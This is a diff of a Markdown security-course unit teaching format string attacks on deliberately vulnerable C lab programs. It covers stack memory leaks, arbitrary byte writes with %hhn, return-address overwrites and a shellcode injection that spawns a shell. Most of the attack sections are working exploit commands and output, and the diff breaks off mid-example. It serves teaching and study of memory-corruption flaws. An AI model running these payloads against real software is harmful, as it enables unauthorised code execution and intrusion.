@@ -1,7 +1,6 @@
 # Unit 6: Format String Attacks
 
-Format String Attacks
-=====================
+# Format String Attacks
 
 A format string attack is an alternate form of exploiting programming
 that doesn't necessarily require smashing the stack. Instead, it
@@ -26,7 +25,7 @@ string portion, not just the arguments to the format. For example:
 In this program, the user provides the format portion of the `printf()`.
 When we run this, for most of the common things, it doesn't matter:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./format_error "Hello World"
 Hello World
 user@si485H-base:demo$ ./format_error "Go Navy"
@@ -41,7 +40,7 @@ output is an address, an address on the stack, more precisely. What if I
 were to give it something longer? What if we were to give it something
 that would cause a memory address to be dereferenced, like a '%s' :
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./format_error "%s.%s.%s.%s.%s.%s.%s"
 4.??u?.UW1?VS???????unull).(null).?$?U?
 user@si485H-base:demo$ ./format_error "%s.%s.%s.%s.%s.%s.%s.%s"
@@ -52,15 +51,13 @@ We can actually get the program to crash, and from we've seen so far,
 getting the program to crash is usually the first step towards
 exploiting the program, which is what we'll eventually do.
 
-Uncommon Formats and Format Options
-===================================
+# Uncommon Formats and Format Options
 
 In order to full leverage the power of the format, we need to review the
 full list of formats and format options. You should refer to the manual
 page for all the details `man 3 printf`.
 
-%n : Saving the Number of Bytes
--------------------------------
+## %n : Saving the Number of Bytes
 
 Format printing services allows you to save the total bytes formatted
 into a variable. There is a decent chance you've never heard of this
@@ -92,7 +89,7 @@ The `%n` format matches to an address, in paticular an address of an
 integer, at which the number of bytes formatted up to that point are
 stored. So, for example, running this program, we get:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./format_n 
 The number of bytes written up to this point X is being stored in count_one, and the number of bytes up to here X is being stored in count_two.
 count_one: 46
@@ -122,7 +119,7 @@ int main(int argc, char * argv[]){
 }
 ```
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./scanf_n 
 1234567890
 Number: 1234567890 Digits: 10
@@ -131,8 +128,7 @@ Number: 1234567890 Digits: 10
 Or for example, to do text align ... there are a lot of reasonable
 reasons to have this format.
 
-Format Flag and Argument Options
---------------------------------
+## Format Flag and Argument Options
 
 Another tool of formats we will need is some of the extra options for
 formats to better manipulate the format output. So far you are fairly
@@ -169,7 +165,7 @@ int main(int argc, char * argv[]){
 }
 ```
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./unusual_formats 
 %d:(-559038737)
 %u:(3735928559)
@@ -205,8 +201,7 @@ convert half the typical size. In this case, since we are working with
 value when using one `h`, or a single char length 1-byte value with two,
 `hh`.
 
-Flag Options for Strings
-------------------------
+## Flag Options for Strings
 
 With strings, things are similar but a bit different. Here's some
 example code:
@@ -228,7 +223,7 @@ int main(int argc, char * argv[]){
 }
 ```
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./string_formats 
 %s:(Go Navy! Beat Army!)
 %50s:(                               Go Navy! Beat Army!)
@@ -268,14 +263,13 @@ int main(int argc, char * argv[]){
 }
 ```
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./scanf_format 
 HELLLOOOOOOOOOOOOOOO
 HELLLOOOOO
 ```
 
-Using formats in an exploit
-===========================
+# Using formats in an exploit
 
 Now that we've had a whirl-wind tour of formats you've never heard of
 nor ever really wanted to use, how can we use them in an exploit. We'll
@@ -321,7 +315,7 @@ You might think because in the first `sprintf()` the `%.400s` format is
 used, this would not enable a overflow of `buffer` or `outbuff`. For
 example, this does not cause a segmentation fault:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./format_overflow `python -c "print 'A'*1000"`
 outbuf: ERR Wrong command: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 ```
@@ -330,7 +324,7 @@ True, we can't overflow `buffer`, but we can overflow `outbuff` because
 `buffer` is treated as the format character. For example, what if the
 input was like:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./format_overflow "%550x"
 outbuf: ERR Wrong command:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               bffff897
 Segmentation fault (core dumped)
@@ -338,7 +332,7 @@ Segmentation fault (core dumped)
 
 And if we look at the `dmesg` output:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ dmesg | tail -1
 [181031.140058] format_overflow[16736]: segfault at 20202020 ip 20202020 sp bffff6b0 error 14
 ```
@@ -347,7 +341,7 @@ We see that we overwrote the instruction pointer with a bunch of 0x20
 bytes, or spaces! Now, the goal is to overwrite the return address with
 something useful, like the address of `bad()`.
 
-``` {.example}
+``` example
 user@si485H-base:demo$ objdump -d format_overflow | grep bad
 08048481 <bad>:
 ```
@@ -356,7 +350,7 @@ To do this, we need to do the right number of extended format to hit the
 return address, We can do this by first using 0xdeadbeef and checking
 the `dmesg` output:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./format_overflow "%500d$(printf '\xef\xbe\xad\xde')" > /dev/null ; dmesg | tail -1
 Segmentation fault (core dumped)
 [181507.663004] format_overflow[16817]: segfault at deadbe ip 08048504 sp bffff6b0 error 4 in format_overflow[8048000+1000]
@@ -380,7 +374,7 @@ Segmentation fault (core dumped)
 So if we use a 505 byte length %d format, the next 4-bytes we write is
 the return address. And adding that, we get what we want:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ objdump -d format_overflow | grep bad
 08048481 <bad>:
 user@si485H-base:demo$ ./format_overflow "%505d$(printf '\x81\x84\x04\x08')" 
@@ -392,7 +386,7 @@ Segmentation fault (core dumped)
 We can also get this to execute a shell in the normal way (note how I
 adjusted the jump point using dmesg).
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./format_overflow "%505d$(printf '\xef\xbe\xad\xde')$(printf $(./hexify.sh smallest_shell))"
 outbuf: ERR Wrong command:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               -1073743746ﾭ?1???Phn/shh//bi??
                                                                                                                                                                          ̀
@@ -407,8 +401,7 @@ I did it!
 $ 
 ```
 
-Reading Memory with Format Attack
-=================================
+# Reading Memory with Format Attack
 
 To start, let's return to the simple format example that is vulnerable:
 
@@ -434,7 +427,7 @@ is: what is actually being accessed when we do this?
 To begin, if we run this program, we can start to get a sense of what is
 going on:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./format_error AAAA
 AAAA
 user@si485H-base:demo$ ./format_error %#08x
@@ -445,8 +438,7 @@ So, if I pass a `%#08x` we can see that there is what seems to be an
 address printed out, and an address that is in the stack range. But,
 what is that address? Where did it come from?
 
-Reading up the stack
---------------------
+## Reading up the stack
 
 Let's look at example `printf()` to think about how the arguments are
 passed to it:
@@ -462,7 +454,7 @@ passed to it:
 The arguments to this function within `printf`'s and `foo`'s stack frame
 will look a little like this:
 
-``` {.example}
+``` example
                 ... 
             |-----------|
           / |  ret addr |
@@ -504,7 +496,7 @@ out the extra arguments to printf().
 
 Now, we can start to get a sense of what happens in the format attack:
 
-``` {.example}
+``` example
                 ... 
             |-----------|
            /|  ret addr |
@@ -525,7 +517,6 @@ frame |     |-----------|
          \  |  local    |
           \ |  variables| <- esp
         '-----------'
-
 ```
 
 Even though we are no longer passing values to printf to use in the
@@ -533,8 +524,7 @@ format, printf will reach into the stack as if they are there. The
 result is that, if we can control the formats to printf, we can view
 arbitrary values on the stack.
 
-Reading from
-------------
+## Reading from
 
 As an example of this, let's return to our function, let's try and get
 the extra variables in `main` to print out. To help with this, we'll add
@@ -558,7 +548,7 @@ int main(int argc, char * argv[]){
 }
 ```
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./format_error %#08x.%#08x
 0xbffff754.0xbffff760
 --- STACK main ---
@@ -587,7 +577,7 @@ seperaet each format to make it easier to read.)
 
 Let's keep going with this little experiment:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./format_error %#08x.%#08x.%#08x
 0xbffff754.0xbffff760.0xb7e4e42d
 --- STACK main ---
@@ -691,13 +681,12 @@ user@si485H-base:demo$ ./format_error %#08x.%#08x.%#08x.%#08x.%#08x.%#08x.%#08x
 0xbffff670 <ebp-0x28>: 08048665
 0xbffff66c <ebp-0x2c>: 0804857e
 0xbffff668 <ebp-0x30>: bffff698
-
 ```
 
 Now, we can change the last format to a `%s` and we can see the "Go Navy
 string"
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./format_error %#08x.%#08x.%#08x.%#08x.%#08x.%#08x.%s
 0xbffff734.0xbffff740.0xb7e4e42d.0xb7fc53c4.0xcafebabe.0xdeadbeef.Go Navy!
 --- STACK main ---
@@ -719,8 +708,7 @@ user@si485H-base:demo$ ./format_error %#08x.%#08x.%#08x.%#08x.%#08x.%#08x.%s
 0xbffff668 <ebp-0x30>: bffff698
 ```
 
-Using Formats to Your Advantage
--------------------------------
+## Using Formats to Your Advantage
 
 So that was a lot of work for tacking on %'s to get to "Go Navy" before.
 We can do better if we leverage the formats. In particular, the argument
@@ -748,7 +736,7 @@ Now, let's do the same thing above to get the format to print. We can
 count 7 total format directives until we reach the string, so we can use
 the `%7$s` to print the string with a single format directive.
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./format_error "%7\$s"
 Go Navy!
 --- STACK main ---
@@ -775,8 +763,7 @@ special bash command.)/
 
 You'll be surprised how useful this is later.
 
-Writing Memory with a Format Attack
-===================================
+# Writing Memory with a Format Attack
 
 Now that you have a sense of how we can read memory arbitrarily, it is
 time to unlock the true magic of the format print: **writing** **to**
@@ -789,8 +776,7 @@ formatted to the right place (e.g., the return address), then you could
 hijack a program! Easy, right?! Well, sometimes ... we'll take it in
 steps.
 
-Controlling where we write
---------------------------
+## Controlling where we write
 
 First let's recall that the `%n` format works. The `%n` format directive
 will write how many bytes have been formatted to the address passed as
@@ -828,7 +814,7 @@ int main(int argc, char * argv[]){
 }
 ```
 
-Let's see if we can overwrite test~val~ with any integer of our
+Let's see if we can overwrite test<sub>val</sub> with any integer of our
 choosing. To start with, let's see if we can change 0x00414141 to
 0xEEDDCCBB.
 
@@ -839,7 +825,7 @@ working in main, we are essentially hunting up the stack trying to find
 the command line argument value that is the format string we are passing
 in.
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./fmt_vuln BBBB
 Right: BBBB
 
@@ -880,7 +866,7 @@ We found it, and the significance of that is really important because
 that means we now control one of the arguments to the format. Consider
 what happens when I change the last format directive to a `%n`.
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./fmt_vuln BBBB.%#08x.%#08x.%#08x.%n
 Right: BBBB.%#08x.%#08x.%#08x.%n
 
@@ -890,14 +876,14 @@ Segmentation fault (core dumped)
 I get a segfault, and now you should all know that that means pay dirt
 for exploits. Let's see where we crashed with dmesg:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ dmesg | tail -1
 [4571638.361817] fmt_vuln[18555]: segfault at 42424242 ip b7e619ee sp bfffed60 error 6 in libc-2.19.so[b7e1b000+1a8000]
 ```
 
 We crashed when we dereferenced 0x42424242, and we control that address.
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./fmt_vuln ABCD.%#08x.%#08x.%#08x.%n
 Right: ABCD.%#08x.%#08x.%#08x.%n
 
@@ -916,14 +902,13 @@ user@si485H-base:demo$ dmesg | tail -1
 If we control that value, it also means that we can put anything there,
 not just deadbeef, but a totally valid address that we want to change.
 
-Writing a Single Byte
----------------------
+## Writing a Single Byte
 
 Now, to write a byte, let's plug into the leading B's the address of the
-target~value~, which we see is 0x804a02c. We can use the command line
-printf to do that output:
+target<sub>value</sub>, which we see is 0x804a02c. We can use the
+command line printf to do that output:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./fmt_vuln $(printf "\x2c\xa0\x04\x08").%#08x.%#08x.%#08x.%n
 Right: ,.%#08x.%#08x.%#08x.%n
 
@@ -942,7 +927,7 @@ writing the number of formatted bytes to a 2-byte short value. And if we
 use `%hhn`, then we are writing the number of formatted bytes to a
 1-byte char value. For example:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./fmt_vuln $(printf "\x2c\xa0\x04\x08").%#08x.%#08x.%#08x.%hn
 Right: ,.%#08x.%#08x.%#08x.%hn
 
@@ -961,7 +946,7 @@ Now that, we've got that one byte written, we have to align it. We are 3
 bytes off, but that is an easy fix by changing the address of where we
 are writing to.
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08").%#08x.%#08x.%#08x.%hhn
 Right: /.%#08x.%#08x.%#08x.%hhn
 
@@ -970,8 +955,7 @@ Wrong: /.0xbffff2b0.0x000400.0x000004.
 [*] test_val @ 0x804a02c = 574701889 0x22414141
 ```
 
-Controlling what you write
---------------------------
+## Controlling what you write
 
 Now that we can write a single byte, how do we control what we write?
 For that, we have to remember exactly what `%n` does, it writes the
@@ -982,7 +966,7 @@ total number of bytes.
 That means, for every additional byte we add prior to the `%n`, we
 increase the value of the byte we write by one.
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08")A.%#08x.%#08x.%#08x.%hhn
 Right: /A.%#08x.%#08x.%#08x.%hhn
 
@@ -1010,7 +994,7 @@ the value we need can be really annoying. There's a better way, and
 again, it relies on the format directive flags. We can arbitrarily
 increase the length of an output by padding 0's. See below:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08").%#08x.%#08x.%#08x.%hhn
 Right: /.%#08x.%#08x.%#08x.%hhn
 
@@ -1046,7 +1030,7 @@ Turns out, we are still in the clear because of overflows. See what
 happens when I set the format length such that we format more than 256
 bytes.
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08").%#08x.%#08x.%#0228x.%hhn
 Right: /.%#08x.%#08x.%#0228x.%hhn
 
@@ -1076,8 +1060,7 @@ Wrong: /.0xbffff2b0.0x000400.0x0000000000000000000000000000000000000000000000000
 As we tick over for 0xff, we wrap back around to 0x00 then 0x01 and so
 on. Now we can full control what we write, and to where.
 
-Writting multiple bytes
------------------------
+## Writting multiple bytes
 
 The final test is getting to write multiple bytes. Our goal is to write
 0xdeabeef over the target. We are actually almost there. The first thing
@@ -1086,7 +1069,7 @@ we need to do is to write 0xbe to the byte we were messing with before.
 Doing some math, we see that we were writing 0x22. To get to 0xbe that
 is an additional 156 bytes in the format or so.
 
-``` {.example}
+``` example
 ser@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08").%#08x.%#08x.%#0156x.%hhn
 Right: /.%#08x.%#08x.%#0156x.%hhn
 
@@ -1097,7 +1080,7 @@ Wrong: /.0xbffff2b0.0x000400.0x0000000000000000000000000000000000000000000000000
 
 That was close. We are off by 8.
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08").%#08x.%#08x.%#0164x.%hhn
 Right: /.%#08x.%#08x.%#0164x.%hhn
 
@@ -1110,7 +1093,7 @@ Ok, now we can write the next byte. We do this by adding another `%hhn`
 to the format string and again, this format directive needs to have an
 address filled.
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08")$(printf "\x2e\xa0\x04\x08")%#08x.%#08x.%#0164x.%hhn.%hhn
 Right: /.%#08x.%#08x.%#0164x.%hhn.%hhn
 
@@ -1127,7 +1110,7 @@ of the format directives we've learned and try and be smart about
 things. Firsts, let's get verything setup so that we have all our `%hhn`
 formats to write to each of the bytes in the target variable.
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08")$(printf "\x2e\xa0\x04\x08")$(printf "\x2d\xa0\x04\x08")$(printf "\x2c\xa0\x04\x08").%1\$08x.%4\$08x.%1\$08x.%\5\$08x.%1\$08x.%\6\$08x.%1\$08x.%\7\$08x
 Right: /.-,.%1$08x.%4$08x.%1$08x.%5$08x.%1$08x.%6$08x.%1$08x.%7$08x
 
@@ -1146,7 +1129,7 @@ Now it is just a matter of changing the `%x` that match the addresses we
 want to write to `%hhn` and then manipulating the number of 0's in the
 output.
 
-``` {.example}
+``` example
 ser@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08")$(printf "\x2e\xa0\x04\x08")$(printf "\x2d\xa0\x04\x08")$(printf "\x2c\xa0\x04\x08").%1\$08x.%4\$hhn.%1\$08x.%\5\$hhn.%1\$08x.%\6\$hhn.%1\$08x.%\7\$hhn
 Right: /.-,.%1$08x.%4$hhn.%1$08x.%5$hhn.%1$08x.%6$hhn.%1$08x.%7$hhn
 
@@ -1160,7 +1143,7 @@ bytes. The first `%1$08x` changes into `%1$0204x` (that is, we were
 printing up to 8 leading 0's, now we need 196 more to reach 204 leading
 zeros).
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08")$(printf "\x2e\xa0\x04\x08")$(printf "\x2d\xa0\x04\x08")$(printf "\x2c\xa0\x04\x08").%1\$0204x.%4\$hhn.%1\$08x.%\5\$hhn.%1\$08x.%\6\$hhn.%1\$08x.%\7\$hhn
 Right: /.-,.%1$0204x.%4$hhn.%1$08x.%5$hhn.%1$08x.%6$hhn.%1$08x.%7$hhn
 
@@ -1175,7 +1158,7 @@ additional 0xad bytes to write, or 195 additional bytes. Again,
 considering that we started by formatting 0x8, that means we change the
 second `%x` to have 205 leading zeros.
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08")$(printf "\x2e\xa0\x04\x08")$(printf "\x2d\xa0\x04\x08")$(printf "\x2c\xa0\x04\x08").%1\$0204x.%4\$hhn.%1\$0205x.%\5\$hhn.%1\$08x.%\6\$hhn.%1\$08x.%\7\$hhn
 Right: /.-,.%1$0204x.%4$hhn.%1$0205x.%5$hhn.%1$08x.%6$hhn.%1$08x.%7$hhn
 
@@ -1188,7 +1171,7 @@ Two more to go. We have `0xb7` needs to become `0xbe`. that's easy,
 that's an additional 7 bytes, so we need to change the next %x to use 15
 leading zeros.
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08")$(printf "\x2e\xa0\x04\x08")$(printf "\x2d\xa0\x04\x08")$(printf "\x2c\xa0\x04\x08").%1\$0204x.%4\$hhn.%1\$0205x.%\5\$hhn.%1\$015x.%\6\$hhn.%1\$08x.%\7\$hhn
 Right: /.-,.%1$0204x.%4$hhn.%1$0205x.%5$hhn.%1$015x.%6$hhn.%1$08x.%7$hhn
 
@@ -1200,7 +1183,7 @@ Wrong: /.-,.00000000000000000000000000000000000000000000000000000000000000000000
 Finally, we have 0xc8 that needs to become 0xef, which requires 39
 additional leading zeros. So the last %x needs to be changed to 47.
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08")$(printf "\x2e\xa0\x04\x08")$(printf "\x2d\xa0\x04\x08")$(printf "\x2c\xa0\x04\x08").%1\$0204x.%4\$hhn.%1\$0205x.%\5\$hhn.%1\$015x.%\6\$hhn.%1\$047x.%\7\$hhn
 Right: /.-,.%1$0204x.%4$hhn.%1$0205x.%5$hhn.%1$015x.%6$hhn.%1$047x.%7$hhn
 
@@ -1211,8 +1194,7 @@ Wrong: /.-,.00000000000000000000000000000000000000000000000000000000000000000000
 
 And there it is: DEADBEEF!
 
-Overwriting the Return Address using a Format
-=============================================
+# Overwriting the Return Address using a Format
 
 So far, we've used format string attacks to overwrite a arbitrary value,
 but we need to now consider using this with an exploit.
@@ -1259,15 +1241,14 @@ Note, I also added the `print_stack()` function so we can see what's
 going in a bit more detail. We will eventually remove it in the complete
 attack.
 
-Alignment
----------
+## Alignment
 
 Before doing all that dirty work, let's setup our format string to be
 properly aligned so we won't have to do a bunch of recalculations. The
 goal is to produce a format string of the right length, with all the
 parts present, such that we can just focus on writing bytes.
 
-``` {.example}
+``` example
                                 need four totoal formats two-pair 
       addr2   addr4            formats to write a four-byte address
        /\      /\   .-------------------------------'---------------------.
@@ -1283,7 +1264,7 @@ parts present, such that we can just focus on writing bytes.
 
 Let's give this format a warm up shot in our program:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./fmt_vuln AAAABBBBCCCCDDDD%1\$008x.%1\$00x.%1\$008x.%1\$00x.%1\$008x.%1$00x.%1\$008x.%1\$00x
 Right: AAAABBBBCCCCDDDD%1$008x.%1$00x.%1$008x.%1$00x.%1$008x.%1-bash0x.%1$008x.%1$00x
 
@@ -1310,7 +1291,7 @@ of the format string itself so we can remove the AAAA and BBBB and CCCC
 and DDDD and replace them with addresses we want to write too. For that,
 we can use a bash script:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ for i in `seq 1 1 200`;  do echo -n "$i "; ./fmt_vuln AAAABBBBCCCCDDDD%1\$008x.%$i\$00x.%1\$008x.%$i\$00x.%1\$008x.%$i\$00x.%1\$008x.%$i\$00x | grep Wrong ; done | grep 41
 41 Wrong: AAAABBBBCCCCDDDDbffff85a.b7fed180.bffff85a.b7fed180.bffff85a.b7fed180.bffff85a.b7fed180
 70 Wrong: AAAABBBBCCCCDDDDbffff85a.b7fdd414.bffff85a.b7fdd414.bffff85a.b7fdd414.bffff85a.b7fdd414
@@ -1325,7 +1306,7 @@ of 0x41's (or other values we are interested in. If you look above, at
 align the way we want. We need to add two bytes to the string to get the
 alignment to work.
 
-``` {.example}
+``` example
 user@si485H-base:demo$ for i in `seq 1 1 200`;  do echo -n "$i "; ./fmt_vuln AAAABBBBCCCCDDDD..%1\$008x.%$i\$00x.%1\$008x.%$i\$00x.%1\$008x.%$i\$00x.%1\$008x.%$i\$00x | grep Wrong ; done | grep 41
 41 Wrong: AAAABBBBCCCCDDDD..bffff858.b7fed180.bffff858.b7fed180.bffff858.b7fed180.bffff858.b7fed180
 70 Wrong: AAAABBBBCCCCDDDD..bffff858.b7fdd414.bffff858.b7fdd414.bffff858.b7fdd414.bffff858.b7fdd414
@@ -1336,7 +1317,7 @@ user@si485H-base:demo$ for i in `seq 1 1 200`;  do echo -n "$i "; ./fmt_vuln AAA
 Notice the extra ".." following the D's to get everything to align
 properly, if we use 121.
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./fmt_vuln AAAABBBBCCCCDDDD..%1\$008x.%121\$00x.%1\$008x.%122\$00x.%1\$008x.%123\$00x.%1\$008x.%124\$00x
 Right: AAAABBBBCCCCDDDD..%1$008x.%121$00x.%1$008x.%122$00x.%1$008x.%123$00x.%1$008x.%124$00x
 
@@ -1361,8 +1342,7 @@ Wrong: AAAABBBBCCCCDDDD..bffff854.41414141.bffff854.42424242.bffff854.43434343.b
 Now we have what we need to completely aligned format string to use in
 our exploit by writing bytes to the right place.
 
-Writing Bytes
--------------
+## Writing Bytes
 
 With a properly aligned format, let's start by writing the bytes we want
 to a locale that we can see clearly the bytes we are writing. The sample
@@ -1370,7 +1350,7 @@ code makes this easy, we'll write to the test value at 0x804a02r. It's
 just a matter of putting that address into our format string and
 inserting some hhn's for writing.
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./fmt_vuln $(printf '\x27\xa0\x04\x08')$(printf '\x26\xa0\x04\x08')$(printf '\x25\xa0\x04\x08')$(printf '\x24\xa0\x04\x08')..%1\$008x.%121\$hhn.%1\$008x.%122\$hhn.%1\$008x.%123\$hhn.%1\$008x.%124\$hhn
 Right: '&%$..%1$008x.%121$hhn.%1$008x.%122$hhn.%1$008x.%123$hhn.%1$008x.%124$hhn
 
@@ -1413,7 +1393,7 @@ significant!)
 Now, that we've gotten all that out of the way, let's get down to the
 business of writing bytes. First, let's find the address of `foo()`:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ objdump -d fmt_vuln | grep foo
 0804852d <foo>:
 ```
@@ -1422,7 +1402,7 @@ Now we get to work. In the most significant byte, currently we are
 writing 0x1b but we need 0x08. This means we have to wrap around. Doing
 some math:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ python -c "print (0x100 - 0x1b) + 0x8 + 8"
 245
 ```
@@ -1430,7 +1410,7 @@ user@si485H-base:demo$ python -c "print (0x100 - 0x1b) + 0x8 + 8"
 We need to write 256 bytes to get to 0x08 when accounting for the 8
 bytes we are already writing.
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./fmt_vuln $(printf '\x27\xa0\x04\x08')$(printf '\x26\xa0\x04\x08')$(printf '\x25\xa0\x04\x08')$(printf '\x24\xa0\x04\x08')..%1\$245x.%121\$hhn.%1\$008x.%122\$hhn.%1\$008x.%123\$hhn.%1\$008x.%124\$hhn
 Right: '&%$..%1$245x.%121$hhn.%1$008x.%122$hhn.%1$008x.%123$hhn.%1$008x.%124$hhn
 
@@ -1455,14 +1435,14 @@ Wrong: '&%$..                                                                   
 Now we need to write 04 byte we are writing 12, so we use the same
 calculation again:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ python -c "print (0x100 - 0x12) + 0x4 + 8"
 250
 ```
 
 Updating our format to do 250 bytes of output:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./fmt_vuln $(printf '\x27\xa0\x04\x08')$(printf '\x26\xa0\x04\x08')$(printf '\x25\xa0\x04\x08')$(printf '\x24\xa0\x04\x08')..%1\$245x.%121\$hhn.%1\$250x.%122\$hhn.%1\$008x.%123\$hhn.%1\$008x.%124\$hhn
 Right: '&%$..%1$245x.%121$hhn.%1$250x.%122$hhn.%1$008x.%123$hhn.%1$008x.%124$hhn
 
@@ -1486,14 +1466,14 @@ Wrong: '&%$..                                                                   
 
 Next we are writing 0x0e and we need to be writing 0x85, so again, math:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ python -c "print 0x85 - 0x0e + 8"
 127
 ```
 
 And an update of the format string:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./fmt_vuln $(printf '\x27\xa0\x04\x08')$(printf '\x26\xa0\x04\x08')$(printf '\x25\xa0\x04\x08')$(printf '\x24\xa0\x04\x08')..%1\$245x.%121\$hhn.%1\$250x.%122\$hhn.%1\$127x.%123\$hhn.%1\$008x.%124\$hhn
 Right: '&%$..%1$245x.%121$hhn.%1$250x.%122$hhn.%1$127x.%123$hhn.%1$008x.%124$hhn
 
@@ -1518,14 +1498,14 @@ Wrong: '&%$..                                                                   
 Now the last byte. We are writing 8f and the target is 2d, which means
 wrapping around:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ python -c "print (0x100 - 0x8f) + 0x2d + 8"
 166
 ```
 
 And now we've got it:
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./fmt_vuln $(printf '\x27\xa0\x04\x08')$(printf '\x26\xa0\x04\x08')$(printf '\x25\xa0\x04\x08')$(printf '\x24\xa0\x04\x08')..%1\$245x.%121\$hhn.%1\$250x.%122\$hhn.%1\$127x.%123\$hhn.%1\$166x.%124\$hhn
 Right: '&%$..%1$245x.%121$hhn.%1$250x.%122$hhn.%1$127x.%123$hhn.%1$166x.%124$hhn
 
@@ -1547,8 +1527,7 @@ Wrong: '&%$..                                                                   
 0xbffff668 <ebp-0x20>: bffff688
 ```
 
-Overwriting the return address
-------------------------------
+## Overwriting the return address
 
 Now, that we have everything in place, it's only a matter of overwriting
 the return address. Fortunately, I've been printing out the stack each
@@ -1556,7 +1535,7 @@ time to make life easier, so we know the address of the return address
 is 0xbffff68c. We can now stick that in to the from of our format string
 to complete the exploit.
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./fmt_vuln $(printf '\x8f\xf6\xff\xbf')$(printf '\x8e\xf6\xff\xbf')$(printf '\x8d\xf6\xff\xbf')$(printf '\x8c\xf6\xff\xbf')..%1\$245x.%121\$hhn.%1\$250x.%122\$hhn.%1\$127x.%123\$hhn.%1\$166x.%124\$hhn
 Right: ????????????????..%1$245x.%121$hhn.%1$250x.%122$hhn.%1$127x.%123$hhn.%1$166x.%124$hhn
 
@@ -1579,13 +1558,12 @@ Wrong: ????????????????..                                                       
 Go Navy!
 ```
 
-Formatting With Less Help
-=========================
+# Formatting With Less Help
 
 Ok, now that we've seen this in action, we need to pull away some of the
 aids that's have been making this easier. In particular, let's no longer
-print the stack each time and let's get rid of the test~val~. Instead,
-we'll have a much, much plainer vulnerable program.
+print the stack each time and let's get rid of the test<sub>val</sub>.
+Instead, we'll have a much, much plainer vulnerable program.
 
 ``` c
 #include <stdio.h>
@@ -1607,8 +1585,7 @@ int main(int argc, char * argv[]){
 }
 ```
 
-Alignment
----------
+## Alignment
 
 Aligning our format is mostly the same process; however, finding the
 target address to overwrite will be different. We should consider a
@@ -1618,14 +1595,14 @@ we are writing.
 This format output is essentially the same as what we've done before,
 but I've added one extra format to the end.
 
-``` {.example}
+``` example
 user@si485H-base:demo$ ./plain_fmt AAAABBBBCCCCDDDD%1\$008x.%1\$00x.%1\$008x.%1\$00x.%1\$008x.%1\$00x.%1\$008x.%1\$00x.%1\$#08x
 AAAABBBBCCCCDDDDbffff724.bffff724.bffff724.bffff724.bffff724.bffff724.bffff724.bffff724.0xbffff724
 ```
 
 That extra format, we'll align up to 0xdeadbeef:
 
-``` {.example}
+``` example
